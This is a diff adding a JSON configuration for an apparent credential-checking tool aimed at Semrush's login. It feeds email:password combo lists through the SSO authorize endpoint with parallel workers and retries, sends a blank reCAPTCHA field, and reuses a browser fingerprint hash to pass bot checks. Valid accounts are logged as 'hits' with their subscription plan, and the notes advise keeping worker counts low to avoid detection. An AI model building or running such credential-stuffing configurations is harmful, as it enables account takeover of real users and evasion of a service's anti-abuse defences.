@@ -1,0 +1,159 @@
+{
+  "id": "semrush",
+  "name": "Semrush",
+  "description": "SSO JSON login — built from ONF capture task_20260613_215600 (www.semrush.com)",
+  "source_capture": "task_20260613_215600",
+  "settings": {
+    "workers": 5,
+    "timeout_seconds": 45,
+    "retry_on_error": 3,
+    "delay_ms": 500
+  },
+  "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
+  "credentials": {
+    "separator": ":",
+    "email_field": "email",
+    "password_field": "password"
+  },
+  "variables": {
+    "base_url": "https://www.semrush.com",
+    "login_url": "https://www.semrush.com/login/?src=header&redirect_to=%2F",
+    "authorize_url": "https://www.semrush.com/sso/authorize",
+    "sso_options_url": "https://www.semrush.com/sso/options?version=4.4.1",
+    "olaf_init_url": "https://www.semrush.com/olaf/init",
+    "dashboard_url": "https://www.semrush.com/",
+    "account_query_url": "https://www.semrush.com/",
+    "sso_version": "4.4.1",
+    "user_agent_hash": "8109d0ebea1d682bbe7bc3ab7242c807"
+  },
+  "steps": [
+    {
+      "id": "login_page",
+      "name": "Load login page (PHPSESSID + site_csrftoken cookies)",
+      "method": "GET",
+      "url": "{{login_url}}",
+      "headers": {
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "User-Agent": "{{user_agent}}"
+      }
+    },
+    {
+      "id": "olaf_init",
+      "name": "Bot/session bootstrap",
+      "method": "POST",
+      "url": "{{olaf_init_url}}",
+      "headers": {
+        "Accept": "*/*",
+        "Origin": "{{base_url}}",
+        "Referer": "{{login_url}}",
+        "User-Agent": "{{user_agent}}"
+      }
+    },
+    {
+      "id": "sso_options",
+      "name": "SSO flags/options",
+      "method": "POST",
+      "url": "{{sso_options_url}}",
+      "headers": {
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "{{base_url}}",
+        "Referer": "{{login_url}}",
+        "User-Agent": "{{user_agent}}"
+      },
+      "body": "{\"withCredentials\":true,\"user-agent-hash\":\"{{user_agent_hash}}\"}"
+    },
+    {
+      "id": "sso_authorize",
+      "name": "Submit credentials",
+      "method": "POST",
+      "url": "{{authorize_url}}",
+      "headers": {
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "{{base_url}}",
+        "Referer": "{{login_url}}",
+        "User-Agent": "{{user_agent}}"
+      },
+      "body": "{\"locale\":\"en\",\"source\":\"semrush\",\"g-recaptcha-response\":\"\",\"user-agent-hash\":\"{{user_agent_hash}}\",\"email\":\"{{email}}\",\"password\":\"{{password}}\"}",
+      "failure_signals": {
+        "status_codes": [401, 403, 429],
+        "body_contains": [
+          "ERROR_INVALID_CREDENTIALS",
+          "invalid email or password",
+          "ERROR_UAHASH_INVALID",
+          "ERROR_RECAPTCHA",
+          "too many attempts"
+        ]
+      }
+    },
+    {
+      "id": "dashboard",
+      "name": "Fetch dashboard for plan hints (temporary until subscription API captured)",
+      "optional": true,
+      "method": "GET",
+      "url": "{{dashboard_url}}",
+      "headers": {
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Referer": "{{login_url}}",
+        "User-Agent": "{{user_agent}}"
+      }
+    }
+  ],
+  "validation": {
+    "hit": {
+      "step": "sso_authorize",
+      "status": 200,
+      "require_extract": []
+    },
+    "fail": {
+      "any_step_failure_signal": true
+    }
+  },
+  "plan_labels": {
+    "free_trial": {
+      "match": { "plan_name_contains": "Trial" },
+      "label": "FREE_TRIAL"
+    },
+    "free": {
+      "match": { "plan_name_contains": "Free" },
+      "label": "FREE"
+    },
+    "pro": {
+      "match": { "plan_name_contains": "Pro" },
+      "label": "PRO"
+    },
+    "guru": {
+      "match": { "plan_name_contains": "Guru" },
+      "label": "GURU"
+    },
+    "business": {
+      "match": { "plan_name_contains": "Business" },
+      "label": "BUSINESS"
+    },
+    "paid": {
+      "match": {},
+      "label": "PAID"
+    }
+  },
+  "output": {
+    "hit_line": "{{email}}:{{password}} | Plan={{plan_name}} | Label={{plan_label}}",
+    "console_hit": "[HIT] {{email}} | Plan: {{plan_name}} ({{plan_label}})",
+    "console_fail": "[FAIL] {{email}} | {{reason}}",
+    "files": {
+      "hits": "results/semrush/run_<timestamp>/hits.txt",
+      "invalid": "results/semrush/run_<timestamp>/invalid.txt",
+      "rate_limited": "results/semrush/run_<timestamp>/rate_limited.txt",
+      "errors": "results/semrush/run_<timestamp>/errors.txt",
+      "summary": "results/semrush/run_<timestamp>/summary.txt"
+    }
+  },
+  "notes": [
+    "Login flow from network.ndjson capture (POST /sso/authorize with email/password JSON).",
+    "user_agent_hash is FingerprintJS visitorId — update from browser DevTools if checks fail with ERROR_UAHASH_INVALID.",
+    "Capture was stopped before login response + subscription API — run ONF again: login successfully, open Profile → Subscription Info, then stop capture.",
+    "Update account_query_url once subscription XHR is found in network.ndjson.",
+    "Semrush uses _sm_bot cookies + optional reCAPTCHA — use 3-5 workers without proxy first.",
+    "Do NOT commit real user_agent_hash tied to your browser session in public repos."
+  ]
+}
